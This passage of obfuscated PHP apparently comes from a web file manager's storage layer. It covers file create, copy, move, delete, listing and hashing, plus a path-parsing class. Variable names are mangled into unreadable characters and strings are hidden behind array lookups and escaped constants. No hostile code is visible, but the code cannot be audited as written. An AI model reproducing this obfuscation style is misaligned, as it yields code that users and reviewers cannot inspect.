KodIO::clear($Õ¬ÖÄğ); $Õ¬ÖÄğ = substr($Õ¬ÖÄğ, strlen($ÕÇÃ‰İÉ)); if (empty($this->pathDriver)) { return $Õ¬ÖÄğ; } return $this->pathDriver . $€å ¤ª[8] . ltrim($Õ¬ÖÄğ, $€å ¤ª[8]); } public function mkfile($­¢ôã¨½, $àª½Å • = '', $ØÙæöÊï = REPEAT_RENAME) { $­¢ôã¨½ = $this->iconvSystem($­¢ôã¨½); @touch($­¢ôã¨½); if ($àª½Å •) { file_put_contents($­¢ôã¨½, $àª½Å •); } @chmod($­¢ôã¨½, $this->pathAuth); if (is_file($­¢ôã¨½)) { return $this->getPathOuter($­¢ôã¨½); } $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } public function mkdir($·š½ô¼ó, $ÅÌªš´æ = REPEAT_SKIP) { $·š½ô¼ó = $this->iconvSystem($·š½ô¼ó); if (is_dir($·š½ô¼ó)) { return $this->getPathOuter($·š½ô¼ó); } @mkdir($·š½ô¼ó, $this->pathAuth, !0); @chmod($·š½ô¼ó, $this->pathAuth); if (is_dir($·š½ô¼ó)) { return $this->getPathOuter($·š½ô¼ó); } $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } public function copyFile($«ÒØøÊô, $¾óŒë‹ä) { $this->mkdir($this->pathFather($¾óŒë‹ä)); $«ÒØøÊô = $this->iconvSystem($«ÒØøÊô); $¾óŒë‹ä = $this->iconvSystem($¾óŒë‹ä); $°‰ƒÑ¦² = copy_64($«ÒØøÊô, $¾óŒë‹ä); @chmod($¾óŒë‹ä, $this->pathAuth); if ($°‰ƒÑ¦²) { return $this->getPathOuter($¾óŒë‹ä); } $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } public function moveFile($úîî¨¦Ç, $­±§¿¯æ) { $this->mkdir($this->pathFather($­±§¿¯æ)); $úîî¨¦Ç = $this->iconvSystem($úîî¨¦Ç); $­±§¿¯æ = $this->iconvSystem($­±§¿¯æ); $¶Ó¢‘Šì = intval(@rename($úîî¨¦Ç, $­±§¿¯æ)); if (!$¶Ó¢‘Šì) { if ($¶Ó¢‘Šì = intval(@copy_64($úîî¨¦Ç, $­±§¿¯æ))) { @unlink($úîî¨¦Ç); } } @chmod($­±§¿¯æ, $this->pathAuth); if ($¶Ó¢‘Šì) { return $this->getPathOuter($­±§¿¯æ); } $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } public function movePath($’íªæœ˜, $«„ÆíÇÓ, $¯ŞÓÙ§¨ = false) { $¡»ŸØ› =& $_SERVER[åÄ¼Ùßš]; $’íªæœ˜ = $this->iconvSystem($’íªæœ˜); $«„ÆíÇÓ = $this->iconvSystem($«„ÆíÇÓ); $ÕÑ²ÔÓ = rtrim($«„ÆíÇÓ, $¡»ŸØ›[8]) . $¡»ŸØ›[8] . ($¯ŞÓÙ§¨ ? $¯ŞÓÙ§¨ : get_path_this($’íªæœ˜)); if (file_exists($ÕÑ²ÔÓ)) { return !1; } $ôªİóº¦ = intval(@rename($’íªæœ˜, $ÕÑ²ÔÓ)); $ôªİóº¦ = file_exists($ÕÑ²ÔÓ); if ($ôªİóº¦) { return $this->getPathOuter($ÕÑ²ÔÓ); } $this->writeLog(__FUNCTION__ . $¡»ŸØ›[1496], !0); return !1; } public function delFile($Èş“Ğ“«) { $Èş“Ğ“« = $this->iconvSystem($Èş“Ğ“«); if (!@unlink($Èş“Ğ“«)) { @chmod($Èş“Ğ“«, $this->pathAuth); if (@unlink($Èş“Ğ“«)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); return !1; } return !0; } public function delFolder($È¯¨Ëª») { $úíÅğ„« =& $_SERVER[åÄ¼Ùßš]; $È¯¨Ëª» = $this->iconvSystem($È¯¨Ëª»); if (!is_dir($È¯¨Ëª»)) { return !0; } if (!($ş‰øÓ× = opendir($È¯¨Ëª»))) { return !1; } while (($‹ Ş‹…Õ = readdir($ş‰øÓ×)) !== !1) { if ($‹ Ş‹…Õ == $úíÅğ„«[10] || $‹ Ş‹…Õ == $úíÅğ„«[1401]) { continue; } $Ğæ˜üï‚ = $È¯¨Ëª» . $úíÅğ„«[8] . $‹ Ş‹…Õ; if (is_file($Ğæ˜üï‚) || is_link($Ğæ˜üï‚)) { if (!unlink($Ğæ˜üï‚)) { chmod($Ğæ˜üï‚, $this->pathAuth); if (!unlink($Ğæ˜üï‚)) { return !1; } } } else { if (is_dir($Ğæ˜üï‚)) { chmod($Ğæ˜üï‚, $this->pathAuth); $Ğæ˜üï‚ = $this->iconvApp($Ğæ˜üï‚); if (!$this->delFolder($Ğæ˜üï‚)) { return !1; } } } } closedir($ş‰øÓ×); return rmdir($È¯¨Ëª»); } public function rename($Ş¥ùŒ¾Ë, $­§ñ‡œì) { $ºÈğíäô =& $_SERVER[åÄ¼Ùßš]; $Œ…·â–¬ = $this->fileNameAuto($this->pathFather($Ş¥ùŒ¾Ë), $­§ñ‡œì); $Œ…·â–¬ = $this->iconvSystem($Œ…·â–¬); $Ş¥ùŒ¾Ë = $this->iconvSystem($Ş¥ùŒ¾Ë); $¸”º×ÛÆ = $this->pathFather($Ş¥ùŒ¾Ë); $êÁ«¿Ğå = rtrim($¸”º×ÛÆ, $ºÈğíäô[8]) . $ºÈğíäô[8] . $Œ…·â–¬; $½´êüà = @rename($Ş¥ùŒ¾Ë, $êÁ«¿Ğå); $êÁ«¿Ğå = $this->iconvApp($êÁ«¿Ğå); if ($½´êüà) { return $this->getPathOuter($êÁ«¿Ğå); } $this->writeLog(__FUNCTION__ . $ºÈğíäô[1496], !0); return !1; } public function size($«®Ğœ•ş) { $«®Ğœ•ş = $this->iconvSystem($«®Ğœ•ş); return filesize_64($«®Ğœ•ş); } public function info($ô™›­¡¿) { $ô™›­¡¿ = $this->iconvSystem($ô™›­¡¿); if ($this->isFolder($ô™›­¡¿)) { return $this->folderInfo($ô™›­¡¿); } else { if ($this->isFile($ô™›­¡¿)) { return $this->fileInfo($ô™›­¡¿); } } return !1; } protected function infoChildren($òÀªÙ¤á, &$¯ çÙ¢†, $Ä¶Ãµà = true) { $†Û×«Ğ =& $_SERVER[åÄ¼Ùßš]; check_abort_echo(); $òÀªÙ¤á = rtrim($òÀªÙ¤á, $†Û×«Ğ[8]) . $†Û×«Ğ[8]; if ($Ä¶Ãµà) { $òÀªÙ¤á = $this->iconvSystem($òÀªÙ¤á); } if (!($ÍŒ²…úÁ = @opendir($òÀªÙ¤á))) { return; } while (($‹ß£™Üä = readdir($ÍŒ²…úÁ)) !== !1) { if ($‹ß£™Üä == $†Û×«Ğ[10] || $‹ß£™Üä == $†Û×«Ğ[1401]) { continue; } $ŠÚ Šë„ = $òÀªÙ¤á . $‹ß£™Üä; if (is_file($ŠÚ Šë„) || is_link($ŠÚ Šë„)) { $¯ çÙ¢†[$†Û×«Ğ[80]]++; $¯ çÙ¢†[$†Û×«Ğ[79]] += filesize_64($ŠÚ Šë„); } else { if (is_dir($ŠÚ Šë„)) { $¯ çÙ¢†[$†Û×«Ğ[81]]++; $this->infoChildren($ŠÚ Šë„, $¯ çÙ¢†, !1); } } } closedir($ÍŒ²…úÁ); } private function folderInfo($†„ò¶ø¶, $ßé—î©£ = false) { $ßóÅ±Ğ› =& $_SERVER[åÄ¼Ùßš]; $†„ò¶ø¶ = rtrim($†„ò¶ø¶, $ßóÅ±Ğ›[8]) . $ßóÅ±Ğ›[8]; $òÀê›³ = $this->iconvApp($this->pathThis($†„ò¶ø¶)); if ($ßé—î©£) { return array($ßóÅ±Ğ›[32] => $òÀê›³, $ßóÅ±Ğ›[87] => $this->getPathOuter($†„ò¶ø¶), $ßóÅ±Ğ›[33] => $ßóÅ±Ğ›[78]); } $ÜìşÈí‰ = array($ßóÅ±Ğ›[32] => $òÀê›³, $ßóÅ±Ğ›[87] => $this->getPathOuter($†„ò¶ø¶), $ßóÅ±Ğ›[33] => $ßóÅ±Ğ›[78], $ßóÅ±Ğ›[234] => @filectime($†„ò¶ø¶), $ßóÅ±Ğ›[88] => @filemtime($†„ò¶ø¶), $ßóÅ±Ğ›[1500] => @fileatime($†„ò¶ø¶), $ßóÅ±Ğ›[1501] => is_readable($†„ò¶ø¶), $ßóÅ±Ğ›[1502] => is_writable($†„ò¶ø¶), $ßóÅ±Ğ›[1503] => get_mode($†„ò¶ø¶)); return $ÜìşÈí‰; } private function fileInfo($äÊ®Áó›, $İè×¢ = false) { $íÙæÜŠÏ =& $_SERVER[åÄ¼Ùßš]; $ÕĞ©¡Ğ = $this->iconvApp($this->pathThis($äÊ®Áó›)); if ($İè×¢) { return array($íÙæÜŠÏ[32] => $ÕĞ©¡Ğ, $íÙæÜŠÏ[87] => $this->getPathOuter($äÊ®Áó›), $íÙæÜŠÏ[33] => $íÙæÜŠÏ[233], $íÙæÜŠÏ[79] => $this->size($äÊ®Áó›), $íÙæÜŠÏ[169] => $this->ext($ÕĞ©¡Ğ)); } $Øğ°¾–Â = array($íÙæÜŠÏ[32] => $ÕĞ©¡Ğ, $íÙæÜŠÏ[87] => $this->getPathOuter($äÊ®Áó›), $íÙæÜŠÏ[33] => $íÙæÜŠÏ[233], $íÙæÜŠÏ[234] => @filectime($äÊ®Áó›), $íÙæÜŠÏ[88] => @filemtime($äÊ®Áó›), $íÙæÜŠÏ[1500] => @fileatime($äÊ®Áó›), $íÙæÜŠÏ[79] => $this->size($äÊ®Áó›), $íÙæÜŠÏ[169] => $this->ext($ÕĞ©¡Ğ), $íÙæÜŠÏ[1501] => is_readable($äÊ®Áó›), $íÙæÜŠÏ[1502] => is_writable($äÊ®Áó›), $íÙæÜŠÏ[1503] => get_mode($äÊ®Áó›)); return $Øğ°¾–Â; } public function exist($Ø¡î) { $Ø¡î = $this->iconvSystem($Ø¡î); return @file_exists($Ø¡î); } public function isFile($¼´šœ™·) { $¼´šœ™· = $this->iconvSystem($¼´šœ™·); return @is_file($¼´šœ™·); } public function isFolder($®½ìàü) { $®½ìàü = $this->iconvSystem($®½ìàü); return @is_dir($®½ìàü); } public function listPath($‚ÙµÜó™, $‘–ª±³« = false) { $§ã¡ÉÁË =& $_SERVER[åÄ¼Ùßš]; $‚ÙµÜó™ = $this->iconvSystem($‚ÙµÜó™); $‚ÙµÜó™ = rtrim($‚ÙµÜó™, $§ã¡ÉÁË[8]) . $§ã¡ÉÁË[8]; $¯¼ö¥§¹ = array($§ã¡ÉÁË[85] => array(), $§ã¡ÉÁË[86] => array()); if (!($åßş„ãÃ = @opendir($‚ÙµÜó™))) { return $¯¼ö¥§¹; } while (($˜Ñİ§¤ = readdir($åßş„ãÃ)) !== !1) { if ($˜Ñİ§¤ == $§ã¡ÉÁË[10] || $˜Ñİ§¤ == $§ã¡ÉÁË[1401]) { continue; } $“§ÃŸ­ä = $‚ÙµÜó™ . $˜Ñİ§¤; if (is_file($“§ÃŸ­ä)) { $¯¼ö¥§¹[$§ã¡ÉÁË[86]][] = $this->fileInfo($“§ÃŸ­ä, $‘–ª±³«); } else { $¯¼ö¥§¹[$§ã¡ÉÁË[85]][] = $this->folderInfo($“§ÃŸ­ä, $‘–ª±³«); } } closedir($åßş„ãÃ); return $¯¼ö¥§¹; } public function listAll($ààÙ€, &$íİƒÆ›ä = array()) { $¢šõ ´¾ =& $_SERVER[åÄ¼Ùßš]; $ààÙ€ = $this->iconvSystem($ààÙ€); $ààÙ€ = rtrim($ààÙ€, $¢šõ ´¾[8]) . $¢šõ ´¾[8]; if (!($á†–Œì = @opendir($ààÙ€))) { return $íİƒÆ›ä; } while (($ ¶£×·ä = readdir($á†–Œì)) !== !1) { if ($ ¶£×·ä == $¢šõ ´¾[10] || $ ¶£×·ä == $¢šõ ´¾[1401]) { continue; } $©ƒà“€‘ = $ààÙ€ . $ ¶£×·ä; $ü­œŸ˜œ = is_dir($©ƒà“€‘) && !is_link($©ƒà“€‘) ? 1 : 0; $©ƒà“€‘ = $ü­œŸ˜œ ? $©ƒà“€‘ . $¢šõ ´¾[8] : $©ƒà“€‘; $íİƒÆ›ä[] = array($¢šõ ´¾[87] => $this->getPathOuter($©ƒà“€‘), $¢šõ ´¾[78] => $ü­œŸ˜œ, $¢šõ ´¾[88] => intval(@filemtime($©ƒà“€‘)), $¢šõ ´¾[79] => $ü­œŸ˜œ ? 0 : intval($this->size($©ƒà“€‘))); if ($ü­œŸ˜œ) { $this->listAll($©ƒà“€‘, $íİƒÆ›ä); } } closedir($á†–Œì); return $íİƒÆ›ä; } public function has($Õı–É¬, $óşûö©ª = false, $”²ïí = true) { $íº«ú‘õ =& $_SERVER[åÄ¼Ùßš]; $Õı–É¬ = $this->iconvSystem($Õı–É¬); $Õı–É¬ = rtrim($Õı–É¬, $íº«ú‘õ[8]) . $íº«ú‘õ[8]; if (!($’ÙÜÛÒ = @opendir($Õı–É¬))) { return !1; } $„şñ•§é = 0; $àÙ‹ñç = 0; $Æ™Î£ï¶ = 0; while (($¨´şö¡ = readdir($’ÙÜÛÒ)) !== !1) { if ($¨´şö¡ == $íº«ú‘õ[10] || $¨´şö¡ == $íº«ú‘õ[1401]) { continue; } $Ù›¤ÆØÈ = $Õı–É¬ . $¨´şö¡; if ($óşûö©ª) { $Æ™Î£ï¶++; if (@is_file($Ù›¤ÆØÈ)) { $„şñ•§é++; } else { $àÙ‹ñç++; } if ($Æ™Î£ï¶ > 10000) { break; } continue; } if ($”²ïí) { if (@is_file($Ù›¤ÆØÈ)) { return !0; } } else { if (@is_dir($Ù›¤ÆØÈ . $íº«ú‘õ[8])) { return !0; } } } closedir($’ÙÜÛÒ); if ($óşûö©ª) { return array($íº«ú‘õ[242] => $„şñ•§é, $íº«ú‘õ[243] => $àÙ‹ñç); } return !1; } public function hashSimple($“˜ë‡£) { $Äœ¿©¡ =& $_SERVER[åÄ¼Ùßš]; if (!$“˜ë‡£) { return md5($Äœ¿©¡[12]); } $“˜ë‡£ = $this->iconvSystem($“˜ë‡£); $º§¡Ñ¥ = $this->size($“˜ë‡£); $š™šØËÈ = 200; $ÒÚóÒã† = 50; if ($º§¡Ñ¥ <= $š™šØËÈ * $ÒÚóÒã†) { return $this->hashMd5($“˜ë‡£) . $º§¡Ñ¥; } $µØÇè® = $Äœ¿©¡[12]; $îùë¢¥° = intval($º§¡Ñ¥ / $ÒÚóÒã†); $ŞĞÒÑş´ = fopen($“˜ë‡£, $Äœ¿©¡[1504]); if (!$ŞĞÒÑş´) { return $µØÇè®; } for ($›Âê•üü = 0; $›Âê•üü < $ÒÚóÒã†; $›Âê•üü++) { fseek_64($ŞĞÒÑş´, $îùë¢¥° * $›Âê•üü); $µØÇè® .= fread($ŞĞÒÑş´, $š™šØËÈ); } fseek_64($ŞĞÒÑş´, $º§¡Ñ¥ - $š™šØËÈ); $µØÇè® .= fread($ŞĞÒÑş´, $š™šØËÈ); fclose($ŞĞÒÑş´); return md5($µØÇè®) . $º§¡Ñ¥; } public function getContent($÷«¯É) { $÷«¯É = $this->iconvSystem($÷«¯É); return file_get_contents($÷«¯É); } public function setContent($ŸæÛ”¸×, $½šä÷¿ö = '') { $ŸæÛ”¸× = $this->iconvSystem($ŸæÛ”¸×); $Ç¡ÊÚ© = @file_put_contents($ŸæÛ”¸×, $½šä÷¿ö, LOCK_EX); if (!$Ç¡ÊÚ©) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][1496], !0); } clearstatcache(); @chmod($ŸæÛ”¸×, $this->pathAuth); return $Ç¡ÊÚ© === !1 ? !1 : !0; } public function fileSubstr($˜™ä, $˜¹¸ôºÛ = 0, $ß¿ÏŒ¯» = false) { $öèË†ïÛ =& $_SERVER[åÄ¼Ùßš]; $˜™ä = $this->iconvSystem($˜™ä); if ($ß¿ÏŒ¯» === !1) { $ß¿ÏŒ¯» = $this->size($˜™ä); } if ($ß¿ÏŒ¯» <= 0) { return $öèË†ïÛ[12]; } $…ê£‹‹ = fopen($˜™ä, $öèË†ïÛ[1504]); if (!$…ê£‹‹) { return !1; } fseek_64($…ê£‹‹, $˜¹¸ôºÛ); $æ®ª€¥³ = fread($…ê£‹‹, $ß¿ÏŒ¯»); fclose($…ê£‹‹); if (!$æ®ª€¥³) { $this->writeLog(__FUNCTION__ . $öèË†ïÛ[1496], !0); } return $æ®ª€¥³; } public function upload($ıçÂ¹”®, $§®¢²ş†, $«©ÔÃİ© = false, $“´ÛÔËõ = REPEAT_REPLACE) { if ($«©ÔÃİ©) { return $this->moveFile($§®¢²ş†, $ıçÂ¹”®); } return $this->copyFile($§®¢²ş†, $ıçÂ¹”®); } public function setModifyTime($ËåİŸ, $Ïı¦–õÌ = '') { @touch($ËåİŸ, intval($Ïı¦–õÌ)); } public function download($‡¿ÇÈ¦£, $á”–Ûã†) { return $this->iconvSystem($‡¿ÇÈ¦£); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($÷ºÇÑ) { parent::__construct($÷ºÇÑ); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } public function fileOutImage($„¬áà¿ı, $¤†èêœ¸ = 250) { $¥™Ëâ¯× =& $_SERVER[åÄ¼Ùßš]; if ($this->size($„¬áà¿ı) > 1024 * 1024 * 25) { return $this->fileOutImageServer($„¬áà¿ı, $¤†èêœ¸); } $‹¸ŞÒó = array($¥™Ëâ¯×[1505] => $¥™Ëâ¯×[1506] . $¤†èêœ¸ . $¥™Ëâ¯×[1507]); $ÆÁˆâ³œ = $this->link($„¬áà¿ı, $‹¸ŞÒó); $this->fileOutLink($ÆÁˆâ³œ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ò¦ÓºÙ) { parent::__construct($Ò¦ÓºÙ); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } public function uploadFormData($Ì’¼üÖŠ, $–™ŒüÒÓ = 3600) { return $this->uploadFormDataV2($Ì’¼üÖŠ, $–™ŒüÒÓ); } } goto C„²•Á“¨‚; f„¼İ‹•Ö: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\x46\x69\154\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\151\x6c\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\x70\x52\157\x6f\x74\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\165\x73\145\162\123\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\123\x68\x61\x72\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\x49\x74\x65\155\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\x63\150\x7d"; const KOD_BLOCK = "\173\142\x6c\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\145\162\122\145\x6e\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\x65\x72\x7d"; public static function typeList() { $÷ù½³›á =& $_SERVER[åÄ¼Ùßš]; return array($÷ù½³›á[1374] => self::KOD_SOURCE, $÷ù½³›á[1375] => self::KOD_USER_RECYCLE, $÷ù½³›á[1376] => self::KOD_USER_FAV, $÷ù½³›á[1377] => self::KOD_USER_FILE_TAG, $÷ù½³›á[1378] => self::KOD_USER_FILE_TYPE, $÷ù½³›á[1379] => self::KOD_GROUP_ROOT_SELF, $÷ù½³›á[1380] => self::KOD_USER_SHARE, $÷ù½³›á[1381] => self::KOD_USER_SHARE_LINK, $÷ù½³›á[1382] => self::KOD_USER_SHARE_TO_ME, $÷ù½³›á[1383] => self::KOD_SHARE_ITEM, $÷ù½³›á[1384] => self::KOD_SHARE_LINK, $÷ù½³›á[1385] => self::KOD_SEARCH, $÷ù½³›á[1386] => self::KOD_BLOCK, $÷ù½³›á[1387] => self::KOD_IO, $÷ù½³›á[1388] => self::KOD_USER_RECENT, $÷ù½³›á[1389] => self::KOD_USER_DRIVER); } public static function parse($ô£Ù‡¤Ä) { $ëüè„øì =& $_SERVER[åÄ¼Ùßš]; $ô£Ù‡¤Ä = self::clear($ô£Ù‡¤Ä); $”¸ê†¡ = array_values(self::typeList()); preg_match($ëüè„øì[1390], $ô£Ù‡¤Ä, $öÓ†İ°–); $ä£ÉÒìê = array($ëüè„øì[508] => !1, $ëüè„øì[1391] => !1, $ëüè„øì[505] => !1, $ëüè„øì[87] => $ô£Ù‡¤Ä, $ëüè„øì[1288] => !1, $ëüè„øì[1287] => $ëüè„øì[12]); if (is_array($öÓ†İ°–) && count($öÓ†İ°–) == 5) { $ïÑĞì¥Ê = $ëüè„øì[1392] . $öÓ†İ°–[2] . $ëüè„øì[404]; if (in_array($ïÑĞì¥Ê, $”¸ê†¡)) { $ä£ÉÒìê[$ëüè„øì[1288]] = $öÓ†İ°–[1]; $ä£ÉÒìê[$ëüè„øì[33]] = $ïÑĞì¥Ê; $ä£ÉÒìê[$ëüè„øì[1393]] = substr($ïÑĞì¥Ê, 1, -1); $ä£ÉÒìê[$ëüè„øì[484]] = $öÓ†İ°–[3]; } $ä£ÉÒìê[$ëüè„øì[1287]] = $öÓ†İ°–[4]; } if ($ä£ÉÒìê[$ëüè„øì[508]] == self::KOD_SOURCE) { $ä£ÉÒìê[$ëüè„øì[484]] = intval($ä£ÉÒìê[$ëüè„øì[484]]); $ä£ÉÒìê[$ëüè„øì[1291]] = $ä£ÉÒìê[$ëüè„øì[484]]; } $÷ÌÁàƒœ = array($ëüè„øì[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ä£ÉÒìê[$ëüè„øì[1356]] = in_array($ä£ÉÒìê[$ëüè„øì[33]], $÷ÌÁàƒœ); return $ä£ÉÒìê; } public static function isTruePath($ÜğûÅÄ) { $ÒÅÀ¿³ =& $_SERVER[åÄ¼Ùßš]; if (substr($ÜğûÅÄ, 0, 1) != $ÒÅÀ¿³[1392]) { return !0; } if (strpos($ÜğûÅÄ, $ÒÅÀ¿³[495]) === 0) { return !0; } if (strpos($ÜğûÅÄ, $ÒÅÀ¿³[1360]) === 0) { return !0; } if (strpos($ÜğûÅÄ, $ÒÅÀ¿³[1394]) === 0) { return !0; } if (strpos($ÜğûÅÄ, $ÒÅÀ¿³[1395]) === 0) { return !0; } if (strpos($ÜğûÅÄ, $ÒÅÀ¿³[1396]) === 0) { return !0; } return !1; } public static function clear($ŠÔ©£ø) { $“¯¢« =& $_SERVER[åÄ¼Ùßš]; $ŠÔ©£ø = str_replace(array($“¯¢«[1189], $“¯¢«[288]), $“¯¢«[53], $ŠÔ©£ø); $ŠÔ©£ø = str_replace($“¯¢«[100], $“¯¢«[8], $ŠÔ©£ø); $–º«´¿ú = $“¯¢«[1397]; if (substr($ŠÔ©£ø, 0, 3) == $“¯¢«[1398]) { $ŠÔ©£ø = substr($ŠÔ©£ø, 3); } while (strstr($ŠÔ©£ø, $–º«´¿ú)) { $ŠÔ©£ø = str_replace($–º«´¿ú, $“¯¢«[8], $ŠÔ©£ø); } $ŠÔ©£ø = preg_replace($“¯¢«[1399], $“¯¢«[8], $ŠÔ©£ø); if ($ŠÔ©£ø == $“¯¢«[8]) { return $“¯¢«[8]; } $ŠÔ©£ø = rtrim($ŠÔ©£ø, $“¯¢«[8]); return $ŠÔ©£ø; } public static function pathTrue($áñçü–¥) { $¥ÒùÕ¿¥ =& $_SERVER[åÄ¼Ùßš]; if (!$áñçü–¥) { return $¥ÒùÕ¿¥[12]; } $áñçü–¥ = str_replace($¥ÒùÕ¿¥[257], $¥ÒùÕ¿¥[8], str_replace($¥ÒùÕ¿¥[1400], $¥ÒùÕ¿¥[8], $áñçü–¥)); $áñçü–¥ = str_replace($¥ÒùÕ¿¥[257], $¥ÒùÕ¿¥[8], str_replace($¥ÒùÕ¿¥[1400], $¥ÒùÕ¿¥[8], $áñçü–¥)); if (!strstr($áñçü–¥, $¥ÒùÕ¿¥[1398])) { return $áñçü–¥; } $Œ”óóæ = explode($¥ÒùÕ¿¥[8], $áñçü–¥); foreach ($Œ”óóæ as $¸ë´úÁÄ => $¿æûÌÎŒ) { if ($¿æûÌÎŒ !== $¥ÒùÕ¿¥[1401]) { continue; } for ($—ãúÉ© = $¸ë´úÁÄ; $—ãúÉ© >= 0; $—ãúÉ©--) { if ($Œ”óóæ[$—ãúÉ©] === $¥ÒùÕ¿¥[10] || $Œ”óóæ[$—ãúÉ©] === $¥ÒùÕ¿¥[1401] || $Œ”óóæ[$—ãúÉ©] === -1) { continue; } if ($Œ”óóæ[$—ãúÉ©] === $¥ÒùÕ¿¥[12]) { $Œ”óóæ[$¸ë´úÁÄ] = -1; break; } $Œ”óóæ[$¸ë´úÁÄ] = -1; $Œ”óóæ[$—ãúÉ©] = -1; break; } } $¼¼Áâ¿ò = array(); foreach ($Œ”óóæ as $¿æûÌÎŒ) { if ($¿æûÌÎŒ !== -1) { $¼¼Áâ¿ò[] = $¿æûÌÎŒ; } } $€¸éÊ¸² = implode($¥ÒùÕ¿¥[8], $¼¼Áâ¿ò); if (strpos($€¸éÊ¸², $¥ÒùÕ¿¥[1402]) === 0) { $€¸éÊ¸² = $¥ÒùÕ¿¥[1398] . substr($€¸éÊ¸², strlen($¥ÒùÕ¿¥[1402])); } return $€¸éÊ¸²; } public static function pathUrlClear($üŞ½«½ı) { $ãı¯³ê‡ =& $_SERVER[åÄ¼Ùßš]; if (!$üŞ½«½ı) { return $üŞ½«½ı; } $üŞ½«½ı = rawurldecode($üŞ½«½ı); $üŞ½«½ı = str_replace($ãı¯³ê‡[1400], $ãı¯³ê‡[8], $üŞ½«½ı); if (strpos($üŞ½«½ı, $ãı¯³ê‡[76]) > 0) { $üŞ½«½ı = substr($üŞ½«½ı, 0, strpos($üŞ½«½ı, $ãı¯³ê‡[76])); } if (strpos($üŞ½«½ı, $ãı¯³ê‡[1403]) > 0) { $üŞ½«½ı = substr($üŞ½«½ı, 0, strpos($üŞ½«½ı, $ãı¯³ê‡[1403])); } return $üŞ½«½ı; } public static function sourceID($•©Šüğ) { $Ö—Ö¾± =& $_SERVER[åÄ¼Ùßš]; $—Ÿõ÷Æä = self::parse($•©Šüğ); if ($—Ÿõ÷Æä[$Ö—Ö¾±[33]] !== self::KOD_SOURCE) { show_json(LNG($Ö—Ö¾±[1404]), !1); } return $—Ÿõ÷Æä[$Ö—Ö¾±[484]]; } public static function make($ÈÔ·¶ï‰) { if (!$ÈÔ·¶ï‰) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÈÔ·¶ï‰)); } public static function makeShare($õ»æƒ©º, $Îšƒ³õÊ) { return self::makePath(self::KOD_SHARE_ITEM, $õ»æƒ©º, $Îšƒ³õÊ); } public static function makeFileTypePath($öåïãÔ¾) { return self::makePath(self::KOD_USER_FILE_TYPE, $öåïãÔ¾); } public static function makeFileTagPath($ƒÍíÊã) { return self::makePath(self::KOD_USER_FILE_TAG, $ƒÍíÊã); } public static function makePath($ù•¨’¤, $ò”Åƒìİ = '', $Õ¤ã÷Ğ = '') { $ ²²áá» =& $_SERVER[åÄ¼Ùßš]; $Éú‚êñª = substr($ù•¨’¤, 1, -1); $ÒŸ©Å½ = $ ²²áá»[1405] . $Éú‚êñª . $ ²²áá»[1406] . $ò”Åƒìİ . $ ²²áá»[1407]; $ÒŸ©Å½ = $Õ¤ã÷Ğ ? $ÒŸ©Å½ . $Õ¤ã÷Ğ . $ ²²áá»[8] : $ÒŸ©Å½; return $ÒŸ©Å½; } public static function hashPath($¼¬úÍëí, $š¢úçÏÀ = false) { $¶ÀÍÓà´ =& $_SERVER[åÄ¼Ùßš]; if (!$¼¬úÍëí) { return $¶ÀÍÓà´[12]; } $²§—ªƒ = is_array($¼¬úÍëí) ? $¼¬úÍëí : IO::info($¼¬úÍëí); $‚˜ÇÜ¾ = _get($²§—ªƒ, $¶ÀÍÓà´[1408], $¶ÀÍÓà´[12]); if (!$‚˜ÇÜ¾ && isset($²§—ªƒ[$¶ÀÍÓà´[554]])) { $‚˜ÇÜ¾ = $²§—ªƒ[$¶ÀÍÓà´[554]]; } if (!$‚˜ÇÜ¾ && isset($²§—ªƒ[$¶ÀÍÓà´[238]])) { $‚˜ÇÜ¾ = trim($²§—ªƒ[$¶ÀÍÓà´[238]], $¶ÀÍÓà´[121]); } if ($‚˜ÇÜ¾) { return $‚˜ÇÜ¾; } if (!$‚˜ÇÜ¾ && isset($²§—ªƒ[$¶ÀÍÓà´[194]]) && $²§—ªƒ[$¶ÀÍÓà´[194]]) { $²§—ªƒ = IO::info(KodIO::make($²§—ªƒ[$¶ÀÍÓà´[194]])); $‚˜ÇÜ¾ = _get($²§—ªƒ, $¶ÀÍÓà´[1408], $¶ÀÍÓà´[12]); if (!$‚˜ÇÜ¾ && isset($²§—ªƒ[$¶ÀÍÓà´[554]])) { $‚˜ÇÜ¾ = $²§—ªƒ[$¶ÀÍÓà´[554]]; } } $Çû¾ÚË¹ = md5($²§—ªƒ[$¶ÀÍÓà´[87]] . $²§—ªƒ[$¶ÀÍÓà´[79]] . $²§—ªƒ[$¶ÀÍÓà´[88]]); 